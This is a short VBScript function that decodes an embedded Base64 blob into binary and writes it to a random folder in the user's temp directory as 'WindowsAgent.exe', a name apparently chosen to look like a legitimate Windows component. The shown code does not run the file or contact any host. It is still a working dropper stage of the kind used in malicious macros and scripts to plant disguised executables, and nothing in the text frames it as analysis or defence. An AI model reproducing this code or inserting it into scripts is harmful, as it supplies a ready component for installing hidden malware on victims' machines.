Function BuildExe(b64String)
	' Convert Base64 to HEX.
	Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
	xmlDoc.LoadXML("<B64DECODE xmlns:dt=" & Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & b64String & "</B64DECODE>")
	exeHex = xmlDoc.selectsinglenode("B64DECODE").nodeTypedValue
	
	' Create the filename and filepath for the executable.
	exeFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & CreateObject("Scripting.FileSystemObject").GetTempName()
	CreateObject("Scripting.FileSystemObject").CreateFolder(exeFile)
	exePath = exeFile & "\" & "WindowsAgent.exe"
	
	' Compile and save the executbale.
	Set exeStream = CreateObject("ADODB.Stream")
	exeStream.Type = 1
	exeStream.Open
	exeStream.Write exeHex
	exeStream.SaveToFile exePath, 2
	
	' Return the executable filepath.
	BuildExe = exePath
End Function
